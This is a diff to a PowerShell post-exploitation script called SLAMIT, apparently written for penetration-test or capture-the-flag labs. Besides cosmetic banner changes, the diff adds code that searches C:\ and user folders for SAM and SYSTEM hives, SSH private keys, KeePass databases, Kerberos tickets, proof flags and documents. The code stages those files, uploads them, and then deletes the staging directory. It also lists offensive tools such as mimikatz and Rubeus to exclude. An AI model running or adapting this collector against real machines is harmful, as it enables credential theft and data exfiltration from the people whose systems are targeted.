@@ -80,73 +80,75 @@ function Write-CompletionMessage {
     Write-Host ""
 }
 
-@"
- .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
-| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
-| |    _______   | || |   _____      | || |      __      | || | ____    ____ | || |     _____    | || |  _________   | |
-| |   /  ___  |  | || |  |_   _|     | || |     /  \     | || ||_   \  /   _|| || |    |_   _|   | || | |  _   _  |  | |
-| |  |  (__ \_|  | || |    | |       | || |    / /\ \    | || |  |   \/   |  | || |      | |     | || | |_/ | | \_|  | |
-| |   '.___`-.   | || |    | |   _   | || |   / ____ \   | || |  | |\  /| |  | || |      | |     | || |     | |      | |
-| |  |`\____) |  | || |   _| |__/ |  | || | _/ /    \ \_ | || | _| |_\/_| |_ | || |     _| |_    | || |    _| |_     | |
-| |  |_______.'  | || |  |________|  | || ||____|  |____|| || ||_____||_____|| || |    |_____|   | || |   |_____|    | |
-| |              | || |              | || |              | || |              | || |              | || |              | |
-| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
- '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 
-            ....................................................................................................
-            ....................................................................................................
-            ..............................................%%+***#%..............................................
-            ............................................##%%....#%+%............................................
-            ............................................%*%......%*%............................................
-            .............................................%+@....@%%*............................................
-            .............................................%+%....%+%.............................................
-            ..............................................%*%..%+%..............................................
-            ...............................................%%%%%%...............................................
-            ..............................................%*+***+%..............................................
-            ..............................................%+***+*%..............................................
-            ..............................................%%%%%%%%..............................................
-            ..............................................%***+++%..............................................
-            ..............................................%***++*%..............................................
-            ..............................................%%%%%%%%..............................................
-            ..............................................%+++*++%..............................................
-            ..............................................%*+****%..............................................
-            ................................%.............%%%%%%%%..............................................
-            .................................%.....:......%****++%.......%......................................
-            ..................................%....@......%+*****%......%......#................................
-            ...................................%....%.....%%%%%%*%......%.....%.................................
-            ..............................................%*+****%...........%..................................
-            ..............................................%******%....................-%........................
-            ..........................%...................%*+****%...................%..........................
-            ............................%...%%%########***++============+++*#%%%...%............................
-            ...............................%-=%=========-=============-====--%=-@...............................
-            ...............................%-=%======-==-=-==================%=-@...............................
-            .....................%%........%==%===--========================-%-=%........@@.....................
-            ...............................%==%======-=====-=================%==%....@%+........................
-            ...............................%==%================--======-=====%==%...............................
-            ...............................%==%==============================%==%...............................
-            ....................#@:........%=-%=========-=====%%=============%==%........*%.....................
-            ......................+%:-:=+--%-=%=====-==%%=====%%====-+%======%==%--@%---%+......................
-            ........................%%%-----:%%%%%%%%%%%%*%@@%--%%%%%-%%%%%%%%%-------%#@.......................
-            ........................%##%%%--------------%--%%%--%#%--%-------------%%###@.......................
-            ........................%##%---%%:------%%*:%--------:---%--=%------%%--:###@.......................
-            .......................:###%----@%:------%-----%----:-------%=----%-----:###@.......................
-            ..................%%%:.-###%--%@---------------%%:-:%:-------------:%@--:###@.......................
-            .......................:###%%-----------%%@----%#%%%%--:%%:------------%%###@.......................
-            ........................#%#%@@%%%%%%%:----:%##%%#%#%%%##%-----%%%%%%%%%%%%%#@.......................
-            ........................###%--------%-----:%#####%%%###%%------%--------=###@.......................
-            ........................###@-------%----%%%%%%##%#%#%%%%%%%@----%-------:###@.......................
-            ........................###@------%--%%------%%%##%###%------@%--%-------%##@.......................
-            ........................###@-----%%---------%%%-:%%%@%%@--------@%%------%##@.......................
-            ........................###@%@%------------%------%-----%#---------------%##@.......................
-            ........................###@%%----------+%--------%-------%--------------%##@.......................
-            ........................###@------------%------------------%-------------%##@.......................
-            .......................:###%#%%%%%%@%%%@@@@@@@@@@%%%%@@%@%@@%%%%%%%%@@@@%%##@.......................
-            .......................=####################################################@.......................
-            ........................%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%........................
-            .............................................%#########*............................................
-            .............................................%##########............................................
-            .....................................%#########################.....................................
-            ......................................::::::::::::::::::::::::......................................
-"@ | Write-Host
+# Create a perfectly aligned SLAMIT banner
+Write-Host ""
+Write-Host " .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------. " -ForegroundColor Cyan
+Write-Host "| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |" -ForegroundColor Cyan
+Write-Host "| |    _______   | || |   _____      | || |      __      | || | ____    ____ | || |     _____    | || |  _________   | |" -ForegroundColor Cyan
+Write-Host "| |   /  ___  |  | || |  |_   _|     | || |     /  \     | || ||_   \  /   _|| || |    |_   _|   | || | |  _   _  |  | |" -ForegroundColor Cyan
+Write-Host "| |  |  (__ \_|  | || |    | |       | || |    / /\ \    | || |  |   \/   |  | || |      | |     | || | |_/ | | \_|  | |" -ForegroundColor Cyan
+Write-Host "| |   '.___`-.   | || |    | |   _   | || |   / ____ \   | || |  | |\  /| |  | || |      | |     | || |     | |      | |" -ForegroundColor Cyan
+Write-Host "| |  |`\____) |  | || |   _| |__/ |  | || | _/ /    \ \_ | || | _| |_\/_| |_ | || |     _| |_    | || |    _| |_     | |" -ForegroundColor Cyan
+Write-Host "| |  |_______.'  | || |  |________|  | || ||____|  |____|| || ||_____||_____|| || |    |_____|   | || |   |_____|    | |" -ForegroundColor Cyan
+Write-Host "| |              | || |              | || |              | || |              | || |              | || |              | |" -ForegroundColor Cyan
+Write-Host "| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |" -ForegroundColor Cyan
+Write-Host " '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' " -ForegroundColor Cyan
+Write-Host ""
+Write-Host "            ...................................................................................................." -ForegroundColor DarkGray
+Write-Host "            ...................................................................................................." -ForegroundColor DarkGray
+Write-Host "            ..............................................%%+***#%.............................................." -ForegroundColor DarkGray
+Write-Host "            ............................................##%%....#%+%............................................" -ForegroundColor DarkGray
+Write-Host "            ............................................%*%......%*%............................................" -ForegroundColor DarkGray
+Write-Host "            .............................................%+@....@%%*............................................" -ForegroundColor DarkGray
+Write-Host "            .............................................%+%....%+%............................................." -ForegroundColor DarkGray
+Write-Host "            ..............................................%*%..%+%.............................................." -ForegroundColor DarkGray
+Write-Host "            ...............................................%%%%%%..............................................." -ForegroundColor DarkGray
+Write-Host "            ..............................................%*+***+%.............................................." -ForegroundColor DarkGray
+Write-Host "            ..............................................%+***+*%.............................................." -ForegroundColor DarkGray
+Write-Host "            ..............................................%%%%%%%%.............................................." -ForegroundColor DarkGray
+Write-Host "            ..............................................%***+++%.............................................." -ForegroundColor DarkGray
+Write-Host "            ..............................................%***++*%.............................................." -ForegroundColor DarkGray
+Write-Host "            ..............................................%%%%%%%%.............................................." -ForegroundColor DarkGray
+Write-Host "            ..............................................%+++*++%.............................................." -ForegroundColor DarkGray
+Write-Host "            ..............................................%*+****%.............................................." -ForegroundColor DarkGray
+Write-Host "            ................................%.............%%%%%%%%.............................................." -ForegroundColor DarkGray
+Write-Host "            .................................%.....:......%****++%.......%......................................" -ForegroundColor DarkGray
+Write-Host "            ..................................%....@......%+*****%......%......#................................" -ForegroundColor DarkGray
+Write-Host "            ...................................%....%.....%%%%%%*%......%.....%................................." -ForegroundColor DarkGray
+Write-Host "            ..............................................%*+****%...........%.................................." -ForegroundColor DarkGray
+Write-Host "            ..............................................%******%....................-%........................" -ForegroundColor DarkGray
+Write-Host "            ..........................%...................%*+****%...................%.........................." -ForegroundColor DarkGray
+Write-Host "            ............................%...%%%########***++============+++*#%%%...%............................" -ForegroundColor DarkGray
+Write-Host "            ...............................%-=%=========-=============-====--%=-@..............................." -ForegroundColor DarkGray
+Write-Host "            ...............................%-=%======-==-=-==================%=-@..............................." -ForegroundColor DarkGray
+Write-Host "            .....................%%........%==%===--========================-%-=%........@@....................." -ForegroundColor DarkGray
+Write-Host "            ...............................%==%======-=====-=================%==%....@%+........................" -ForegroundColor DarkGray
+Write-Host "            ...............................%==%================--======-=====%==%..............................." -ForegroundColor DarkGray
+Write-Host "            ...............................%==%==============================%==%..............................." -ForegroundColor DarkGray
+Write-Host "            ....................#@:........%=-%=========-=====%%=============%==%........*%....................." -ForegroundColor DarkGray
+Write-Host "            ......................+%:-:=+--%-=%=====-==%%=====%%====-+%======%==%--@%---%+......................" -ForegroundColor DarkGray
+Write-Host "            ........................%%%-----:%%%%%%%%%%%%*%@@%--%%%%%-%%%%%%%%%-------%#@......................." -ForegroundColor DarkGray
+Write-Host "            ........................%##%%%--------------%--%%%--%#%--%-------------%%###@......................." -ForegroundColor DarkGray
+Write-Host "            ........................%##%---%%:------%%*:%--------:---%--=%------%%--:###@......................." -ForegroundColor DarkGray
+Write-Host "            .......................:###%----@%:------%-----%----:-------%=----%-----:###@......................." -ForegroundColor DarkGray
+Write-Host "            ..................%%%:.-###%--%@---------------%%:-:%:-------------:%@--:###@......................." -ForegroundColor DarkGray
+Write-Host "            .......................:###%%-----------%%@----%#%%%%--:%%:------------%%###@......................." -ForegroundColor DarkGray
+Write-Host "            ........................#%#%@@%%%%%%%:----:%##%%#%#%%%##%-----%%%%%%%%%%%%%#@......................." -ForegroundColor DarkGray
+Write-Host "            ........................###%--------%-----:%#####%%%###%%------%--------=###@......................." -ForegroundColor DarkGray
+Write-Host "            ........................###@-------%----%%%%%%##%#%#%%%%%%%@----%-------:###@......................." -ForegroundColor DarkGray
+Write-Host "            ........................###@------%--%%------%%%##%###%------@%--%-------%##@......................." -ForegroundColor DarkGray
+Write-Host "            ........................###@-----%%---------%%%-:%%%@%%@--------@%%------%##@......................." -ForegroundColor DarkGray
+Write-Host "            ........................###@%@%------------%------%-----%#---------------%##@......................." -ForegroundColor DarkGray
+Write-Host "            ........................###@%%----------+%--------%-------%--------------%##@......................." -ForegroundColor DarkGray
+Write-Host "            ........................###@------------%------------------%-------------%##@......................." -ForegroundColor DarkGray
+Write-Host "            .......................:###%#%%%%%%@%%%@@@@@@@@@@%%%%@@%@%@@%%%%%%%%@@@@%%##@......................." -ForegroundColor DarkGray
+Write-Host "            .......................=####################################################@......................." -ForegroundColor DarkGray
+Write-Host "            ........................%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%........................" -ForegroundColor DarkGray
+Write-Host "            .............................................%#########*............................................" -ForegroundColor DarkGray
+Write-Host "            .............................................%##########............................................" -ForegroundColor DarkGray
+Write-Host "            .....................................%#########################....................................." -ForegroundColor DarkGray
+Write-Host "            ......................................::::::::::::::::::::::::......................................" -ForegroundColor DarkGray
+Write-Host ""
 
 Write-SectionHeader "Download Tools"
 
@@ -217,6 +219,16 @@ catch
 Write-CompletionMessage "winPEAS Enumeration Complete"
 
 Write-SectionHeader "File Discovery and Collection"
+
+# Create a dedicated staging directory for discovered files
+$stagingDir = Join-Path -Path $thisDir -ChildPath "SLAMIT_Discovered_Files"
+if (Test-Path $stagingDir) {
+    Remove-Item -Path $stagingDir -Recurse -Force
+}
+New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
+
+Write-Host "Created staging directory: $stagingDir" -ForegroundColor Yellow
+
 # File extensions to include
 $extensions = @(
     '*.txt', '*.log', '*.pdf', '*.zip', '*.doc', '*.docx', '*.xls', '*.xlsx',
@@ -224,16 +236,26 @@ $extensions = @(
     '*.yaml', '*.yml', '*.json', '*.xml', '*.ps1', '*.bat', '*.cmd', '*.sh',
     '*.kdbx', '*.rdp', '*.7z', '*.rar', '*.tar', '*.gz', '*.bak', '*.old',
     '*.tmp', '*.db', '*.sqlite', '*.sqlite3', '*.mdb', '*.accdb', '*.rtf', '*.md',
-    '*.kerberoast', '*.kirb', "*.exe"
+    '*.kerberoast', '*.kirb'
 )
-# Add interesting files
+# Add interesting files (exclude .exe to avoid tool contamination)
 $interestingFiles = @(".git*", "id_rsa", "id_ecdsa", "local.txt", "proof.txt", "SAM", "SYSTEM")
 
 # Define source and destination
 $sourceRoot = "C:\"
 
+# Comprehensive list of tools and scripts to exclude
+$excludePatterns = @(
+    "mimikatz*", "SharpHound*", "winPEAS*", "PowerView*", "PowerUp*", 
+    "BloodHound*", "custom_upload*", "slamit*", "PsExec*", "Rubeus*", 
+    "chisel*", "agent*", "*.ps1", "*.exe", "*.bat", "*.cmd"
+)
+
 try {
     $allFiles = @()
+    $stagedFiles = @()
+
+    Write-Host "Searching for interesting files..." -ForegroundColor Yellow
 
     # Search for interesting files
     foreach ($if in $interestingFiles) {
@@ -243,52 +265,68 @@ try {
         }
     }
 
-    # Search Users folder for extensions
+    # Search Users folder for extensions (exclude tool files)
     $sourceRoot += "Users"
     foreach ($ext in $extensions) {
-        $found = Get-ChildItem -Path $sourceRoot -Recurse -Filter $ext -File -ErrorAction SilentlyContinue `
-            -Exclude "mimikatz*", "SharpHound*", "winPEAS", "PowerView*", "PowerUp*", "BloodHound*", "custom_upload*"
+        $found = Get-ChildItem -Path $sourceRoot -Recurse -Filter $ext -File -ErrorAction SilentlyContinue
         if ($found) {
-            $allFiles += $found
+            # Filter out tool files and scripts
+            $filteredFiles = $found | Where-Object { 
+                $fileName = $_.Name.ToLower()
+                $shouldExclude = $false
+                foreach ($pattern in $excludePatterns) {
+                    if ($fileName -like $pattern.ToLower()) {
+                        $shouldExclude = $true
+                        break
+                    }
+                }
+                -not $shouldExclude
+            }
+            if ($filteredFiles) {
+                $allFiles += $filteredFiles
+            }
         }
     }
 
+    Write-Host "Found $($allFiles.Count) interesting files" -ForegroundColor Green
+
+    # Stage files to the dedicated directory
     foreach ($file in $allFiles) {
-        # Sanitize original path for use in filename
-        $sanitizedPath = ($file.DirectoryName -replace "[:\\]", "_")  # Replace invalid chars with "_"
-
-        # Base name logic: If SAM or SYSTEM, append part of path
-        if ($file.Name -match "^(SAM|SYSTEM)$") {
-            $newFileName = "$($file.Name)_$sanitizedPath"
-        }
-        else {
-            $newFileName = $file.Name
-        }
-
-        $targetPath = Join-Path -Path $thisDir -ChildPath $newFileName
-        $counter = 1
-
-        # Handle conflicts by adding -1, -2, etc.
-        while (Test-Path $targetPath) {
-            $baseName = [System.IO.Path]::GetFileNameWithoutExtension($newFileName)
-            $extension = [System.IO.Path]::GetExtension($newFileName)
-            $targetPath = Join-Path -Path $thisDir -ChildPath "$baseName-$counter$extension"
-            $counter++
-        }
-
-        # Copy file
         try {
+            # Create a unique filename to avoid conflicts
+            $fileName = $file.Name
+            $baseName = [System.IO.Path]::GetFileNameWithoutExtension($fileName)
+            $extension = [System.IO.Path]::GetExtension($fileName)
+            
+            # For system files like SAM/SYSTEM, include path info
+            if ($fileName -match "^(SAM|SYSTEM)$") {
+                $sanitizedPath = ($file.DirectoryName -replace "[:\\]", "_")
+                $fileName = "$baseName`_$sanitizedPath$extension"
+            }
+            
+            $targetPath = Join-Path -Path $stagingDir -ChildPath $fileName
+            $counter = 1
+
+            # Handle conflicts by adding -1, -2, etc.
+            while (Test-Path $targetPath) {
+                $targetPath = Join-Path -Path $stagingDir -ChildPath "$baseName-$counter$extension"
+                $counter++
+            }
+
+            # Copy file to staging directory
             Copy-Item -Path $file.FullName -Destination $targetPath -ErrorAction Stop
-            Write-Host "Copied: $($file.FullName) → $targetPath"
+            $stagedFiles += $targetPath
+            Write-Host "Staged: $($file.Name) → $targetPath" -ForegroundColor Green
         }
         catch {
-            Write-Warning "Failed to copy: $($file.FullName) — $_"
+            Write-Warning "Failed to stage: $($file.FullName) — $_"
         }
     }
 
+    Write-Host "Successfully staged $($stagedFiles.Count) files to: $stagingDir" -ForegroundColor Green
 }
 catch {
-    Write-Warning "Script failed: $_"
+    Write-Warning "File discovery failed: $_"
 }
 
 Write-CompletionMessage "File Discovery and Collection Complete"
@@ -297,25 +335,21 @@ Write-CompletionMessage "File Discovery and Collection Complete"
 Write-SectionHeader "File Upload"
 try
 {
-    # Collect all matching files that have been copied or moved to the current directory.
-    $files = @()
-    foreach ($ext in $extensions)
-    {
-        $found = Get-ChildItem -Path $thisDir -Recurse -Filter $ext -File -ErrorAction SilentlyContinue `
-            -Exclude "mimikatz*", "SharpHound*", "winPEAS", "PowerView*", "PowerUp*", "BloodHound*"
-        if ($found)
-        {
-            $files += $found
-        }
-        $found = Get-ChildItem -Path $thisDir -Recurse -Filter ".git*" -File -ErrorAction SilentlyContinue `
-            -Exclude "mimikatz*", "SharpHound*", "winPEAS", "PowerView*", "PowerUp*", "BloodHound*"
-        if ($found)
-        {
-            $files += $found
-        }
+    # Only upload files from the staging directory to prevent duplicates and tool contamination
+    if (-not (Test-Path $stagingDir)) {
+        Write-Warning "Staging directory not found. No files to upload."
+        return
     }
 
-    Write-Host "Starting upload of $($files.Count) files..." -ForegroundColor Yellow
+    # Get all files from the staging directory
+    $files = Get-ChildItem -Path $stagingDir -File -Recurse -ErrorAction SilentlyContinue
+    
+    if ($files.Count -eq 0) {
+        Write-Host "No files found in staging directory to upload." -ForegroundColor Yellow
+        return
+    }
+
+    Write-Host "Starting upload of $($files.Count) staged files..." -ForegroundColor Yellow
     
     $uploadCount = 0
     $successCount = 0
@@ -382,9 +416,20 @@ catch
 
 Write-CompletionMessage "File Upload Complete"
 
+# Cleanup staging directory
+try {
+    if (Test-Path $stagingDir) {
+        Remove-Item -Path $stagingDir -Recurse -Force
+        Write-Host "Cleaned up staging directory: $stagingDir" -ForegroundColor Green
+    }
+}
+catch {
+    Write-Warning "Failed to cleanup staging directory: $_"
+}
+
 # Final completion message
 Write-Host ""
 Write-SectionHeader "SLAMIT COMPLETE"
 Write-Host "All operations completed successfully!" -ForegroundColor Green
-Write-Host "Check the current directory for collected files and enumeration results." -ForegroundColor Yellow
+Write-Host "Files were staged, uploaded, and cleaned up automatically." -ForegroundColor Yellow
 Write-Host ""
